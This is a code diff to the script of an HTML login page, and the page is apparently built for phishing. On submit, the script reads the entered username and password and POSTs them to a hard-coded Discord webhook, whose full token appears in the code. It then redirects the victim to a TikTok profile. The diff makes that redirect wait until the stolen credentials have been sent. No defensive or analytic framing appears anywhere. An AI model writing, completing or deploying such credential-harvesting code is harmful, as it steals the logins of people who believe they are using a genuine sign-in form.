@@ -26,8 +26,8 @@
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault(); 
     
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
+      const username = document.querySelector("input[name='username']").value;
+      const password = document.querySelector("input[name='password']").value;
     
       fetch("https://discord.com/api/webhooks/1358989761104183406/BVN_t28suVl5zOwjRFRWxqH-NuTncU8PC_HyatFzyeOx6mi7EqBciGxnsl-tEEmwjvaw", {
         method: "POST",
@@ -37,12 +37,17 @@
         body: JSON.stringify({
           content: `📥 صفوان :\n👤 Username: ${username}\n🔑 Password: ${password}`
         })
+      }).then(response => {
+        if (response.ok) {
+          
+          window.location.href = "https://www.tiktok.com/@musaila_10?is_from_webapp=1&sender_device=pc";
+        } else {
+          console.error("فشل في إرسال البيانات");
+        }
       });
-    
-      
-      window.location.href = "https://www.tiktok.com/@musaila_10?is_from_webapp=1&sender_device=pc";
     });
-    </script>
+  </script>
 </body>
 </html>
+
 
